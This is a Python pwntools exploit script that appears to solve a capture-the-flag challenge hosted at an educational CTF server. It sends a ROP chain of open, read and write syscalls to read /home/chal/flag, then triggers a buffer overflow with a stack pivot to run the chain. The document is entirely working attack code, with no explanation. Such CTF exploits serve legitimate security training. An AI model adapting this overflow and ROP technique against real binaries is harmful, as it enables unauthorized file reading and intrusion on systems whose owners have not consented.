from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote('edu-ctf.zoolab.org', '10005')
# r = process("./share/chal")

fn = 0x4E3340
ROP_addr = 0x4E3360

pop_rdi_ret = 0x4038B3
pop_rsi_ret = 0x402428
pop_rdx_ret = 0x493A2B
pop_rax_ret = 0x45DB87
syscall_ret = 0x4284B6
leave_ret = 0x40190C

ROP = flat(
    pop_rdi_ret, fn,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 3,
    pop_rsi_ret, fn,
    pop_rdx_ret, 0x30, 0x1,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret,
)

r.sendafter(b"Give me filename: ", b"/home/chal/flag\0")
r.sendafter(b"Give me ROP: ", b"A" * 0x8 + ROP)
r.sendafter(b"Give me overflow: ", b"A" * 0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
